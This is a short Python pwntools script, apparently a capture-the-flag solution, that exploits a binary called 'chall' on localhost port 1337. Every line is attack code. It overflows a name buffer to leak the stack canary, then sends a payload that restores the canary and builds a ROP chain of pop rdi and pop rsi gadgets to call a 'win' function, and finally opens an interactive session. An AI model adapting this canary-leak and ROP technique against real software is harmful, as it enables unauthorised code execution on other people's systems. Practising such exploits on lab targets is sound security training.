from pwn import *

#p = gdb.debug("./chall", '''
#    b * main
#''')
p = remote("localhost", 1337)

p.recvuntil(b"name: ")
p.sendline(b"A"*72)

p.recvline()
p.sendline(b"N")
canary = u64(p.recv(7).rjust(8, b"\x00"))
print("Canary: ", hex(canary))

p.recvuntil(b"name: ")

payload  = b"A"*72
payload += p64(canary)
payload += b"A"*8
payload += p64(0x4023dd) # pop rdi ; pop rbp ; ret
payload += p64(0xdeadbeef)
payload += p64(0x12345678)
payload += p64(0x40272c) # pop rsi ; pop rbp ; ret
payload += p64(0xcafebabe)
payload += p64(0x12345678)
payload += p64(0x401970) # win
p.sendline(payload)

p.recvuntil(b"confirm:")
p.sendline(b"Y")


p.interactive()
